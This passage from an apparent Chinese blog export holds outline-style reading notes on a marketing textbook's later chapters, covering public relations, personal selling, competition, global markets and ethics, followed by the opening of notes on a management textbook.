POP)</li><li>比赛、抽奖和游戏(Contests, Sweepstakes and Games)</li></ul></li><li>中间商促销工具</li><li>企业促销工具</li></ul></li><li>拟定营业推广方案</li></ul><h3 id="公共关系"><a href="#公共关系" class="headerlink" title="公共关系"></a>公共关系</h3><ul><li>公共关系部门所执行的是以下的任何或所有的功能<ul><li>新闻界关系或新闻代理: 创造并将有新闻价值的信息刊登于新闻媒体, 以引起大众对某些人物、产品或服务的注意。</li><li>产品宣传: 宣传某些特定的产品。</li><li>公共事务: 建立和维持国内和当地的社区关系。</li><li>游说: 建立和维持与立法者及政府官员的良好关系, 以影响有利于公司的立法和规章。</li><li>投资者关系: 维持与股东和其他金融界人物的关系。</li><li>发展: 发展与捐款人或非盈利组织会员的公共关系以赢得财务上或志愿者的支持</li></ul></li><li>公共关系的主要工具</li><li>公共关系的主要决策<ul><li>设定公共关系目标</li><li>选择公共关系的信息和工具</li><li>执行公共关系方案</li><li>评估公共关系活动的成果</li></ul></li></ul><h3 id="案例十六-汉堡王-Burger-King-寻找正确的信息"><a href="#案例十六-汉堡王-Burger-King-寻找正确的信息" class="headerlink" title="案例十六 汉堡王( Burger King) : 寻找正确的信息"></a>案例十六 汉堡王( Burger King) : 寻找正确的信息</h3><h2 id="第十七章、产品促销-人员推销与销售管理"><a href="#第十七章、产品促销-人员推销与销售管理" class="headerlink" title="第十七章、产品促销: 人员推销与销售管理"></a>第十七章、产品促销: 人员推销与销售管理</h2><h3 id="人员推销的角色"><a href="#人员推销的角色" class="headerlink" title="人员推销的角色"></a>人员推销的角色</h3><ul><li>人员推销的性质</li><li>销售人员的角色</li></ul><h3 id="管理销售人员"><a href="#管理销售人员" class="headerlink" title="管理销售人员"></a>管理销售人员</h3><ul><li>设计销售人员的策略和结构<ul><li>销售人员结构<ul><li>地区销售人员结构</li><li>产品销售人员结构</li><li>顾客销售人员结构</li><li>综合销售人员结构</li></ul></li><li>销售人员的规模</li><li>其他销售人员策略和结构问题<ul><li>外勤和内部销售人员</li><li>小组销售</li></ul></li></ul></li><li>销售人员的招募与甄选<ul><li>优秀销售人员的条件是什么?</li><li>招募的程序</li><li>遴选销售人员</li></ul></li><li>培训销售人员</li><li>销售人员的酬劳 <img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_20.png"></li><li>销售人员的监督<ul><li>销售人员的指导</li><li>决定目标顾客和访问方式</li><li>有效地运用销售时间</li><li>销售人员的激励<ul><li>组织气氛</li><li>销售配额</li><li>正面的激励</li></ul></li></ul></li><li>销售人员的评估<ul><li>信息来源</li><li>正式的绩效评估<ul><li>销售人员绩效的比较</li><li>本期与前期销售额的比较</li><li>销售人员的定性评估</li></ul></li></ul></li></ul><h3 id="人员推销的原则"><a href="#人员推销的原则" class="headerlink" title="人员推销的原则"></a>人员推销的原则</h3><ul><li>人员推销的过程</li><li>推销过程的步骤<ul><li>发掘和选拔合格者</li><li>事前筹划</li><li>接近</li><li>介绍和示范</li><li>应付反对意见</li><li>成交</li><li>事后追踪</li></ul></li><li>关系市场营销</li></ul><h3 id="案例十七-国际商用机器公司-IBM-重组销售人员"><a href="#案例十七-国际商用机器公司-IBM-重组销售人员" class="headerlink" title="案例十七 国际商用机器公司( IBM) : 重组销售人员"></a>案例十七 国际商用机器公司( IBM) : 重组销售人员</h3><h2 id="第十八章、通过满意、价值和质量建立与顾客的关系"><a href="#第十八章、通过满意、价值和质量建立与顾客的关系" class="headerlink" title="第十八章、通过满意、价值和质量建立与顾客的关系"></a>第十八章、通过满意、价值和质量建立与顾客的关系</h2><h3 id="顾客价值和满意的定义"><a href="#顾客价值和满意的定义" class="headerlink" title="顾客价值和满意的定义"></a>顾客价值和满意的定义</h3><ul><li>顾客价值</li><li>顾客满意</li></ul><h3 id="交付顾客价值和满意"><a href="#交付顾客价值和满意" class="headerlink" title="交付顾客价值和满意"></a>交付顾客价值和满意</h3><ul><li>价值链</li><li>价值交付系统</li></ul><h3 id="保留顾客"><a href="#保留顾客" class="headerlink" title="保留顾客"></a>保留顾客</h3><ul><li>损失顾客的成本</li><li>顾客保留的必要</li><li>关键: 顾客关系市场营销<ul><li>财务上的利益</li><li>社会的利益</li><li>结构的联系</li></ul></li><li>最后的测试: 顾客盈利能力</li></ul><h3 id="实施总的质量市场营销"><a href="#实施总的质量市场营销" class="headerlink" title="实施总的质量市场营销"></a>实施总的质量市场营销</h3><ul><li>全面质量管理</li><li>市场营销对全面质量的作用</li></ul><h3 id="案例十八-牛排店-打破常规"><a href="#案例十八-牛排店-打破常规" class="headerlink" title="案例十八 牛排店: 打破常规"></a>案例十八 牛排店: 打破常规</h3><h2 id="第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略"><a href="#第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略" class="headerlink" title="第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略"></a>第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略</h2><h3 id="竞争对手分析"><a href="#竞争对手分析" class="headerlink" title="竞争对手分析"></a>竞争对手分析</h3><ul><li>识别公司的竞争者</li><li>确定竞争者对手的目标</li><li>识别竞争者的策略</li><li>评估竞争者的长处和短处</li><li>估计竞争者的反应</li><li>选择攻击对象与回避对象<ul><li>强大或弱小的竞争者</li><li>接近或疏远竞争者</li><li>“品行良好”或“具破坏性”的竞争者</li></ul></li><li>设计竞争情报系统</li></ul><h3 id="基本的竞争性策略"><a href="#基本的竞争性策略" class="headerlink" title="基本的竞争性策略"></a>基本的竞争性策略</h3><ul><li>基本的竞争策略<ul><li>3种制胜的策略<ul><li>总成本领先</li><li>差异化</li><li>集中化</li></ul></li><li>价值准则<ul><li>卓越经营</li><li>顾客的亲密关系</li><li>产品领导地位</li></ul></li></ul></li><li>竞争的地位</li><li>市场领导者的策略<ul><li>扩展整个市场<ul><li>新的使用者</li><li>新用途</li><li>更多的用量</li></ul></li><li>保护市场份额</li><li>扩充市场份额</li></ul></li><li>市场挑战者的策略<ul><li>确定策略目标和竞争者</li><li>选择市场攻击策略</li></ul></li><li>市场跟随者的策略</li><li>市场填补者的策略</li></ul><h3 id="平衡消费者和竞争者导向"><a href="#平衡消费者和竞争者导向" class="headerlink" title="平衡消费者和竞争者导向"></a>平衡消费者和竞争者导向</h3><h3 id="案例十九-宝洁公司-走向全球——在化妆品中一种新的方法"><a href="#案例十九-宝洁公司-走向全球——在化妆品中一种新的方法" class="headerlink" title="案例十九 宝洁公司: 走向全球——在化妆品中一种新的方法"></a>案例十九 宝洁公司: 走向全球——在化妆品中一种新的方法</h3><h2 id="第二十章、全球市场"><a href="#第二十章、全球市场" class="headerlink" title="第二十章、全球市场"></a>第二十章、全球市场</h2><h3 id="进入-21-世纪的全球市场营销"><a href="#进入-21-世纪的全球市场营销" class="headerlink" title="进入 21 世纪的全球市场营销"></a>进入 21 世纪的全球市场营销</h3><h3 id="考察全球的市场营销环境"><a href="#考察全球的市场营销环境" class="headerlink" title="考察全球的市场营销环境"></a>考察全球的市场营销环境</h3><ul><li>国际贸易体系<ul><li>关贸总协定</li><li>区域的自由贸易区</li></ul></li><li>经济环境<ul><li>国家的产业结构<ul><li>自给自足经济(Subsistence Economies)</li><li>原材料出口经济(Raw-Material-Exporting Economies)</li><li>开发中经济(Industrializing Economies)</li><li>工业经济(Industrial Economies)</li></ul></li><li>收入分配<ul><li>赤贫</li><li>均贫</li><li>贫富悬殊</li><li>贫、富、中产阶级并存</li><li>大部分为中等家庭收入</li></ul></li></ul></li><li>政治—法律环境<ul><li>对国际采购的态度</li><li>政治的稳定性</li><li>金融管制</li><li>政府的官僚</li></ul></li><li>文化环境</li></ul><h3 id="决定是否向海外发展"><a href="#决定是否向海外发展" class="headerlink" title="决定是否向海外发展"></a>决定是否向海外发展</h3><h3 id="决定进入哪些市场"><a href="#决定进入哪些市场" class="headerlink" title="决定进入哪些市场"></a>决定进入哪些市场</h3><img src="/2018/10/31/2018-10-31-readingNoteMarketing/2018_11_04_19.png"><h3 id="决定如何进入市场"><a href="#决定如何进入市场" class="headerlink" title="决定如何进入市场"></a>决定如何进入市场</h3><ul><li>出口</li><li>合资经营<ul><li>授权许可( Licensing)</li><li>契约生产</li><li>管理契约</li><li>合资所有制</li></ul></li><li>直接投资</li></ul><h3 id="拟定全球市场营销方案"><a href="#拟定全球市场营销方案" class="headerlink" title="拟定全球市场营销方案"></a>拟定全球市场营销方案</h3><ul><li>产品</li><li>促销</li><li>定价</li><li>销售渠道</li></ul><h3 id="决定全球市场营销组织"><a href="#决定全球市场营销组织" class="headerlink" title="决定全球市场营销组织"></a>决定全球市场营销组织</h3><h3 id="案例二十-哈迪公司-Hardee’-s-在韩国的市场营销"><a href="#案例二十-哈迪公司-Hardee’-s-在韩国的市场营销" class="headerlink" title="案例二十 哈迪公司(Hardee’ s) : 在韩国的市场营销"></a>案例二十 哈迪公司(Hardee’ s) : 在韩国的市场营销</h3><h2 id="第二十一章、服务、组织、人物、地点与概念的营销"><a href="#第二十一章、服务、组织、人物、地点与概念的营销" class="headerlink" title="第二十一章、服务、组织、人物、地点与概念的营销"></a>第二十一章、服务、组织、人物、地点与概念的营销</h2><h3 id="服务市场营销"><a href="#服务市场营销" class="headerlink" title="服务市场营销"></a>服务市场营销</h3><ul><li>服务的本质和特点<ul><li>无形性</li><li>不可分离性</li><li>不稳定性</li><li>易消逝性</li></ul></li><li>服务公司的市场营销策略<ul><li>管理差异</li><li>管理服务质量</li><li>管理生产率</li></ul></li><li>国际服务市场营销</li></ul><h3 id="组织市场营销"><a href="#组织市场营销" class="headerlink" title="组织市场营销"></a>组织市场营销</h3><ul><li>形象的评估</li><li>形象规划与控制</li></ul><h3 id="人物市场营销"><a href="#人物市场营销" class="headerlink" title="人物市场营销"></a>人物市场营销</h3><h3 id="地方市场营销"><a href="#地方市场营销" class="headerlink" title="地方市场营销"></a>地方市场营销</h3><ul><li>营业用地营销( Bus iness Site Marketing )</li><li>旅游营销( T our ism Market ing)</li></ul><h3 id="概念营销"><a href="#概念营销" class="headerlink" title="概念营销"></a>概念营销</h3><h3 id="案例二十一-城市年-City-Year-像企业一样经营一个非盈利组织"><a href="#案例二十一-城市年-City-Year-像企业一样经营一个非盈利组织" class="headerlink" title="案例二十一 城市年( City Year ) : 像企业一样经营一个非盈利组织"></a>案例二十一 城市年( City Year ) : 像企业一样经营一个非盈利组织</h3><h2 id="第二十二章、市场营销与社会-社会责任与市场营销道德"><a href="#第二十二章、市场营销与社会-社会责任与市场营销道德" class="headerlink" title="第二十二章、市场营销与社会: 社会责任与市场营销道德"></a>第二十二章、市场营销与社会: 社会责任与市场营销道德</h2><h3 id="社会对营销活动的批评"><a href="#社会对营销活动的批评" class="headerlink" title="社会对营销活动的批评"></a>社会对营销活动的批评</h3><ul><li>市场营销对个别消费者的影响<ul><li>高价格<ul><li>分销成本高</li><li>高广告和促销费用</li><li>超额加成</li></ul></li><li>欺诈行为</li><li>高压推销</li><li>劣质或不安全产品</li><li>有计划地使产品过时</li><li>对社会地位低下的消费者服务质量差</li></ul></li><li>市场营销对整个社会的冲击<ul><li>错误的欲望和过度的物质主义</li><li>社会公共财物太少</li><li>文化污染</li><li>政治权势过大</li></ul></li><li>市场营销对其它企业的冲击</li></ul><h3 id="市民与公众行动对市场营销的管制"><a href="#市民与公众行动对市场营销的管制" class="headerlink" title="市民与公众行动对市场营销的管制"></a>市民与公众行动对市场营销的管制</h3><ul><li>消费者主义</li><li>环境保护主义</li><li>对市场营销管理的公众行动</li></ul><h3 id="企业走向对社会负责任的市场营销"><a href="#企业走向对社会负责任的市场营销" class="headerlink" title="企业走向对社会负责任的市场营销"></a>企业走向对社会负责任的市场营销</h3><ul><li>进步的市场营销观念<ul><li>消费者导向营销</li><li>创新市场营销</li><li>价值市场营销</li><li>使命感市场营销</li><li>社会市场营销</li></ul></li><li>市场营销的道德观</li></ul><h3 id="市场营销公共政策的原则"><a href="#市场营销公共政策的原则" class="headerlink" title="市场营销公共政策的原则"></a>市场营销公共政策的原则</h3><ul><li>消费者和生产者自由原则</li><li>抑制潜在伤害原则</li><li>满足基本需求原则</li><li>经济效率原则</li><li>创新原则</li><li>消费者教育和充分信息原则</li><li>消费者保护原则</li></ul><h3 id="案例二十二-雀巢公司-又遭到攻击"><a href="#案例二十二-雀巢公司-又遭到攻击" class="headerlink" title="案例二十二 雀巢公司: 又遭到攻击"></a>案例二十二 雀巢公司: 又遭到攻击</h3>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>读书笔记————管理学第三版</title>
    <url>/2018/10/27/2018-10-27-readingNoteManagement/</url>
    <content><![CDATA[<h1 id="管理学（第三版）"><a href="#管理学（第三版）" class="headerlink" title="管理学（第三版）"></a>管理学（第三版）</h1><ul><li>主编：周三多</li></ul><h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_04.bmp"><h2 id="第一篇、总论"><a href="#第一篇、总论" class="headerlink" title="第一篇、总论"></a>第一篇、总论</h2><h3 id="一、管理活动与管理理论"><a href="#一、管理活动与管理理论" class="headerlink" title="一、管理活动与管理理论"></a>一、管理活动与管理理论</h3><ul><li>管理活动<ul><li>管理的定义<ul><li>组织为了达到个人无法实现的目标，通过各项职能活动，合理分配、协调相关资源的过程。</li><li>进一步解释<ul><li>管理的载体是组织</li><li>管理的本质是合理分配和协调各种资源的过程，而不是其他</li><li>管理的对象是相关资源，即包括人力资源在内的一切可以调用的资源</li><li>管理的职能活动包括信息、决策、计划、组织、领导、控制和创新</li><li>管理的目的是为了实现既定的目标，而该目标仅凭单个人的力量是无法实现的，这也是建立组织的原因</li></ul></li></ul></li><li>管理的职能 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_27_01.bmp"> * 决策是计划的前提，计划是决策的逻辑延续。管理者在行使其他管理职能的过程中总会面临决策和计划的问题，决策和计划是其他管理职能的依据。 * 组织、领导和控制旨在保证决策的顺利实施。 * 创新贯穿于各种管理职能和各个组织层次之中。</li><li>管理者的角色与技能<ul><li>管理者的角色 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_27_02.bmp"></li><li>管理者的技能 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_27_03.bmp"></li></ul></li></ul></li><li>中外早期管理思想<ul><li>中国早期管理思想<ul><li>2 000 多年前的春秋时代，杰出的军事家孙武著有《孙子兵法》一书</li><li>战国时代的另一本书《周礼》对封建国家的管理体制进行了理想化的设计</li><li>战国时代的军事家孙嫔运用运筹学和对策论的思想，帮助田忌在赛马中胜了齐王</li><li>中国古代管理思想在许多著作中都有体现，如《孙子兵法》、《周礼》、《墨子》、《老子》、《管子》、《齐民要术》、《天工开物》等</li></ul></li><li>外国早期管理思想<ul><li>亚当·斯密(Adam Smith ,1723一1790) 的劳动分工观点和经济人观点</li><li>小瓦特(James Watt Jr. ,1769一1848) 和博尔顿(Mattew R. Boulton,1770一1842) 的科学管理制度</li><li>马萨诸塞车祸与所有权和管理权的分离</li><li>欧文( Robert Owen, 1771一1858 ) 的人事管理</li><li>巴贝奇( Charles Bab bag , 1 792—1871 ) 的作业研究和报酬制度</li><li>亨利· 汤( Henry R. Towne,1844—1924 ) 的收益分享制度</li><li>哈尔西 (Frederick A. Halsey, 1856一193I)’的 奖金方案</li></ul></li></ul></li><li>管理理论的形成与发展<ul><li>古典管理理论<ul><li>科学管理理论<ul><li>泰罗的贡献<ul><li>工作定额</li><li>标准化</li><li>能力与工作相适应</li><li>差别计件工资制</li><li>计划职能与执行职能相分离</li></ul></li><li>其他人的贡献<ul><li>美国工程师弗兰克· 吉尔布雷斯及其夫人莉莲·吉尔布雷斯在动作研究和工作简化方面做出了突出贡献</li><li>美国管理学家、机械工程师甘特是泰罗在米德维尔钢铁公司和伯利恒钢铁公司的重要合作者。他最重要的贡献是他创造的“甘特图”，这是一种用线条表示的计划图</li></ul></li></ul></li><li>组织管理理论<ul><li>法约尔的贡献<ul><li>企业的基本活动和管理的五种职能<ul><li>技术活动，指生产、制造和加工。</li><li>商业活动，指采购、销售和交换。</li><li>财务活动，指资金的筹措、运用和控制。</li><li>安全活动，指设备的维护和人员的保护</li><li>会计活动，指货物盘点、成本统计和核算。</li><li>管理活动，指计划、组织、指挥、协调和控制</li></ul></li><li>管理的14条原则<ul><li>分工</li><li>权力与责任</li><li>纪律</li><li>统一指挥</li><li>统一领导</li><li>个人利益服从集体利益</li><li>报酬合理</li><li>集权与分权</li><li>等级链与跳板</li><li>秩序</li><li>公平</li><li>人员稳定</li><li>首创精神</li><li>集体精神</li></ul></li></ul></li><li>韦伯的贡献<ul><li>理想的行政组织体系<ul><li>存在明确的分工</li><li>按等级原则对各种公职或职位进行法定安排，形成一个自上而下的指挥链或等级体系</li><li>根据经过正式考试或教育培训而获得的技术资格来选拔员工，并完全根据职务的要求来任用。</li><li>除个别需要通过选举产生的公职以外，所有担任公职的人都是任命的</li><li>行政管理人员是“专职的“管理人员，领取固定的”薪金”，有明文规定的升迁制度。</li><li>行政管理人员不是其管辖的企业的所有者，只是其中的工作人员</li><li>行政管理人员必须严格遵守组织中的规则、纪律和办事程序</li><li>组织中成员之间的关系以理性准则为指导，不受个人情感的影响</li></ul></li></ul></li><li>巴纳德的贡献<ul><li>经理人员的职能<ul><li>建立并维护一个信息系统</li><li>使组织中每个人都能做出贡献</li><li>明确组织的目标</li></ul></li></ul></li></ul></li></ul></li><li>行为管理理论<ul><li>梅奥(George E. Mayo ,1880—1949) 及其领导的霍桑试验</li><li>行为科学</li></ul></li><li>数量管理理论<ul><li>运筹学</li><li>系统分析<ul><li>确定系统的最终目标，同时明确每个特定阶段的目标和任务</li><li>必须把研究对象视作一个整体，一个统一的系统，然后确定每个局部要解决的任务，研究它们之间以及它们与总体目标之间的相互关系和相互影响</li><li>寻求完成总体目标及各个局部任务的可供选择的方案</li><li>对可供选择的方案进行分析和比较，选出最优方案</li><li>实施组织所选方案</li></ul></li><li>决策科学化</li></ul></li><li>系统管理理论<ul><li>系统管理理论是指运用系统理论中的范畴、原理，对组织中的管理活动和管理过程，特别是组织结构和模式进行分析的理论</li><li>组织是一个系统，是由相互联系、相互依存的要素构成的</li><li>系统在一定的环境下生存，与环境进行物质、能量和信息的交换</li><li>运用系统观点来考察管理的基本职能，可以提高组织的整体效率，使管理人员不至于只重视某些与自己有关的特殊职能而忽视了大目标，也不至于忽视自已在组织中的地位和作用</li></ul></li><li>权变管理理论<ul><li>权变管理理论是20世纪70年代在美国形成的一种管理理论。这一理论的核心是力图研究组织与环境的联系，并确定各种变揖的关系类型和结构类型。它强调管理要根据组织所处的环境随机应变，针对不同的环境寻求相应的管理模式。</li></ul></li><li>全面质量管理<ul><li>全面质昼管理的本质是由顾客需求和期望驱动企业持续不断改善的管理理念<ul><li>关注顾客</li><li>注重持续改善</li><li>关注流程</li><li>精确测董</li><li>授权于员工</li></ul></li></ul></li><li>20世纪90年代的管理理论新发展<ul><li>学习型组织</li><li>精益思想</li><li>业务流程再造</li><li>核心能力理论</li></ul></li></ul></li></ul><h3 id="二、管理道德与企业社会责任"><a href="#二、管理道德与企业社会责任" class="headerlink" title="二、管理道德与企业社会责任"></a>二、管理道德与企业社会责任</h3><ul><li>管理与伦理道德<ul><li>伦理道德的真谛<ul><li>伦理与道德作为人类文明的基本因子，是指评价人类行为善与恶的社会价值形态，在日常生活中具体表现为一定的行为规范和准则。任何社会任何组织要想长期生存，不仅需要遵守法律，同时还必须遵守一定的道德规范。</li></ul></li><li>伦理道德的管理学意义<ul><li>经济与经营活动的意义，尤其是对终极意义的追求</li><li>企业组织</li><li>人文力与企业精神</li><li>企业及其产品的价值观</li></ul></li></ul></li><li>几种相关的道德观<ul><li>功利主义道德观<ul><li>这种观点认为，能给行为影响所及的大多数人带来最大利益的行为才是善的<ul><li>功利主义道德观有其合理的一面，因为人类的行为一般都是基于动机，动机就是期望行为带来某些有利的结果</li><li>存在两个不可回避的问题<ul><li>为了实现最大利益，可能采取了不公平、不道德甚至损害了他人或社会利益的手段</li><li>只是规定了对大多数人有利，而没有规定所得利益如何在相关人员中分配，所以很可能产生利益分配不公，一小部分人利用手中的职权或资本，获取了绝大部分的利益，而大部分人只得到了一小部分的利益，形成贫富两极分化的现象，这也是不道德的</li></ul></li></ul></li></ul></li><li>权利至上道德观<ul><li>这种观点认为，能尊重和保护个人基本权利的行为才是善的</li><li>权利至上的道德观对组织而言，在管理实践中也有消极的一面<ul><li>因为组织整体利益的需要和个人的权利不可能完全一致</li></ul></li></ul></li><li>公平公正道德观<ul><li>这种观点认为，管理者不能因种族、肤色、性别、个性、个人爱好、国籍、户籍等因素对部分员工歧视，而那些按照同工同酬的原则和公平公正的标准向员工支付薪酬的行为是善的</li><li>这种道德观在理论上是完全正确的，但在实践中情况却十分复杂</li></ul></li><li>社会契约道德观<ul><li>这种观点认为，只要按照企业所在地区政府和员工都能接受的社会契约所进行的管理行为就是善的</li><li>契约论的道德观有很大的局限性。因为契约具有很强的情境特征，在很多场合是相关各方利益博弈的结果，与合理性无关</li></ul></li><li>推己及人道德观<ul><li>许多成功的管理者在决定管理行为时，都学会了“换位思考”‘.. 将心比心” 、“设身处地”考虑问题。他们十分重视对上级的“忠诚”，对下属的“仁爱”；对朋友的“义气”和“诚信”以及各方面关系的”和谐”</li><li>在竞争激烈的社会中，推己及人的道德观却经常被讥讽为“书生气”‘或“竞争不力”的诟病</li></ul></li></ul></li><li>道德管理的特征和影响管理道德的因素<ul><li>道德管理的特征<ul><li>合乎道德的管理不仅把遵守道德规范视作组织获取利益的一种手段，而且更把其视作组织的一项责任</li><li>合乎道德的管理不仅从组织自身角度更应从社会整体角度看问题</li><li>合乎道德的管理尊重所有者以外的利益相关者的利益，善于处理组织与利益相关者的关系，也善于处理管理者与一般员工及一般员工内部的关系</li><li>合乎道德的管理不仅把人看作手段，更把人看作目的</li><li>合乎道德的管理超越了法律的要求，能让组织取得卓越的成就</li><li>合乎道德的管理具有自律的特征</li><li>合乎道德的管理以组织的价值观为行为导向</li></ul></li><li>影晌管理道德的因素<ul><li>道德发展阶段 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_05.bmp"></li><li>个人特性</li><li>组织结构<ul><li>组织内部机构和职责分工有没有必要的权力制衡、监察、检查、审计机制，有没有外部群众和舆论监督</li><li>组织内部有无明确的规章制度</li><li>上级管理行为的示范作用</li><li>绩效评估考核体系会起到指挥棒的作用</li></ul></li><li>组织文化</li><li>问题强度</li></ul></li></ul></li><li>改善企业道德行为的途径<ul><li>挑选高道德素质的员工</li><li>建立道德守则和决策规则</li><li>管理者在道德方面领导员工<ul><li>高层管理人员在言行方面是员工的表率</li><li>高层管理人员可以通过奖惩机制来影响员工的道德行为</li><li>高层管理者要勇千承担责任</li></ul></li><li>设定工作目标</li><li>对员工进行道德教育</li><li>对绩效进行全面评价</li><li>进行独立的社会审计</li><li>提供正式的保护机制</li></ul></li><li>企业的社会责任<ul><li>企业与现代社会<ul><li>企业是现代社会的产物</li><li>企业从社会得到的权利与依法克尽的义务之间并不平衡</li></ul></li><li>企业的价值观<ul><li>价值观是关于价值的一定信念、倾向、主张和态度的系统观点</li><li>企业价值观主要表现在全体成员对本企业”应当是什么”和“应当做什么“的高度认同<img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_06.bmp"></li></ul></li><li>企业社会责任的体现<ul><li>办好企业，把企业做强、做大、做久</li><li>企业一切经营管理行为应符合道德规范</li><li>社区福利投资</li><li>社会慈善事业</li><li>自觉保护自然环境</li></ul></li></ul></li></ul><h3 id="三、全球化与管理"><a href="#三、全球化与管理" class="headerlink" title="三、全球化与管理"></a>三、全球化与管理</h3><ul><li>全球化内涵<ul><li>世界层面上的全球化内涵<ul><li>在世界层面上，全球化是指国家之间日益增长的经济相互依赖性，反映在商品、服务、资本和信息等方面不断增长的跨国流通上</li></ul></li><li>国家或地区层面上的全球化内涵<ul><li>在国家或地区层面上，全球化是指一个国家或地区的经济与世界其他领域之间的联系程度</li></ul></li><li>产业层面上的全球化内涵<ul><li>在产业层面上，全球化是指某一产业在全球范围内的扩张和活动，以及在全球国家或地区间相互依赖的程度</li></ul></li><li>企业层面上的全球化内涵<ul><li>在公司层面上，全球化是指公司在各国或地区的收人分而和资产扩展困的程度，以及与各国或地区的资本、商品和信息的跨国／地区交流程度</li></ul></li></ul></li><li>全球化与管理者<ul><li>全球化管理的环境因素<ul><li>全球化的一般环境<ul><li>政治与法律环境<ul><li>国家政治体制</li><li>政治的稳定性</li><li>政府对外来经营者的态度</li><li>法律环境</li></ul></li><li>经济和技术环境<ul><li>经济体制和经济政策</li><li>经济发展水平及其发展潜力</li><li>市场规模及其准入程度</li><li>科技发展水平</li><li>社会基础设施</li></ul></li><li>文化环境<ul><li>权力距离</li><li>不确定性的避免</li><li>个人主义或集体主义</li><li>男性化或女性化</li><li>长期导向或短期导向</li></ul></li></ul></li><li>全球化的任务环境<ul><li>供应商<ul><li>全球化进程使得全球化采购和全球化外包得以进行。</li></ul></li><li>销售商<ul><li>全球化给企业带来更为丰富的销售商选择机会</li></ul></li><li>顾客</li><li>竞争对手<ul><li>不论是跨国经营还是当地经营，全球化环境导致来自国内外日益加剧的竞争挑战</li></ul></li><li>劳动力市场及工会<ul><li>全球化不仅促进了劳动力在不同国家或地区间的流动，而且加快了劳动力市场的一体化和规范化</li></ul></li></ul></li></ul></li><li>全球化管理者的关键能力<ul><li>国际商务知识</li><li>文化适应能力</li><li>视角转换能力</li><li>创新能力</li></ul></li></ul></li><li>全球化与管理职能<ul><li>全球化经营的进入方式决策<ul><li>出口<ul><li>间接出口</li><li>直接出口</li></ul></li><li>非股权安排<ul><li>特许</li><li>合同制造</li><li>管理合同</li></ul></li><li>国际直接投资<ul><li>合资进入</li><li>独资进人</li><li>新建进入</li><li>购并进人</li></ul></li></ul></li><li>全球化经营的组织模式<ul><li>全球化的压力</li><li>当地化的压力</li><li>全球化组织模式的选择<ul><li>多国组织模式</li><li>国际组织模式</li><li>全球组织模式</li><li>跨国组织模式</li></ul></li></ul></li><li>全球化经营的领导风格 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_07.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_08.bmp"></li><li>全球化经营的管理控制<ul><li>管理控制系统的制定逻辑</li><li>管理控制系统的设计</li></ul></li></ul></li></ul><h3 id="四、信息与信息化管理"><a href="#四、信息与信息化管理" class="headerlink" title="四、信息与信息化管理"></a>四、信息与信息化管理</h3><ul><li>信息及其特征<ul><li>信息的定义<ul><li>在管理学科中，通常认为“数据经过加工处理就成了信息。”<img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_09.bmp"></li></ul></li><li>对信息的评估</li><li>有用信息的特征 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_10.bmp"></li></ul></li><li>信息管理工作<ul><li>信息的采集<ul><li>明确采集的目的</li><li>界定采集的范围</li><li>选择信息源</li></ul></li><li>信息的加工<ul><li>鉴别<ul><li>查证法</li><li>比较法</li><li>佐证法</li><li>逻辑法</li></ul></li><li>筛选<ul><li>真实性筛选</li><li>适用性筛选</li><li>精约性筛选</li><li>先进性筛选</li></ul></li><li>排序</li><li>初步激活</li><li>编写</li></ul></li><li>信息的存储<ul><li>信息的存储工作由归档、登录、编目、编码、排架等环节构成<ul><li>准确性问题</li><li>安全性问题</li><li>费用问题</li><li>方便性问题</li></ul></li></ul></li><li>信息的传播<ul><li>目的更加具体</li><li>控制更加严密</li><li>时效更加显著</li><li>导致信息畸变的原因<ul><li>传播主体的干扰</li><li>传播渠道的干扰</li><li>传播的客观障碍的存在</li></ul></li></ul></li><li>信息的利用<ul><li>信息的利用过程通常包括以下步骤<ul><li>管理者在认清问题性质的前提下，判断什么样的信息有助千问题的解决。</li><li>对组织目前拥有的信息资源进行梳理，在此基础上，判断所需的信息是否存在“</li><li>如果组织中存在所需的信息，则可直接利用。如果不存在，则要考虑是否能够通过对现有信息进行开发、整合来满足管理者对信息的需要。如果不能，则要考虑重新采集信息，回到信息管理的源头。</li></ul></li><li>更好地利用信息<ul><li>善于开发信息</li><li>为信息价值的充分发挥提供组织上的保证</li><li>用发展的眼光看待信息的价值</li></ul></li><li>尽力避免以下现象<ul><li>信息孤岛</li><li>信息过载</li></ul></li></ul></li><li>信息的反馈<ul><li>反馈信息真实、准确</li><li>信息传递迅速、及时</li><li>控制措施适当、有效</li></ul></li></ul></li><li>信息化管理<ul><li>信息系统的要素 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_11.bmp"></li><li>企业信息化管理的发展<ul><li>20世纪60年代开环的物料需求计划</li><li>20世纪70年代闭环的物料需求计划 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_12.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_13.bmp"></li><li>20世纪80年代制造资源计划 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_14.bmp"></li><li>20世纪90年代企业资源计划<ul><li>最初Gartner Group 公司是通过一系列的功能来对ERP 进行界定的：<ul><li>超越MRP II 范围的集成功能-包括质量管理、试验室管理、流程作业管理、配方管理、产品数据管理、维护管理、管理报告和仓库管理</li><li>支持混合方式的制造环境~括既可支持离散又可支持流程的制造环境，以及按照面向对象的业务模型组合业务过程的能力和在国际范图内的应用。</li><li>支持能动的监控能力，提高业务绩效~括在整个企业内采用控制和工程方法、模拟功能、决策支持和用于生产及分析的图形能力</li><li>支持开放的客户机／服务器计算环境一—包括客户机／服务器体系结构、图形用户界面、计算机辅助设计工程、面向对象设计技术、使用结构化查询语言 